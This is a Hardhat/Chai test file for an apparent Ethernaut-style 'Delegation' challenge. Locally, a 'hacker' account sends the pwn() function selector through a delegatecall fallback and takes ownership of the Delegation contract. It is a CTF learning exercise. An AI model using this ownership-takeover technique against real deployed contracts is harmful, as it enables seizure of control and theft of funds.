const { loadFixture, } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
  
describe("Level06 - Delegation", function () {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const ProxyContract = await ethers.deployContract("Delegate", [owner]);
        const ProxyAddress = await ProxyContract.getAddress();

        const DelegationContract = await ethers.deployContract("Delegation", [ProxyAddress]);
        const DelegationAddress = await ProxyContract.getAddress();

        return {owner, hacker, ProxyContract, DelegationContract, DelegationAddress, ProxyAddress};
    };

    describe("Level06 hacking", () => {
        it("should allow the hacker to call pwn() and take ownership of the Delegation contract", async() => {
            const {owner, hacker, ProxyContract, DelegationContract, DelegationAddress, ProxyAddress} = await loadFixture(setUp);
                    
            await hacker.sendTransaction({to: await DelegationContract.getAddress(), data: (ethers.id("pwn()")).substring(0,10)})
            
            expect(await DelegationContract.owner()).to.equal(hacker.address);
        }); 

    })

});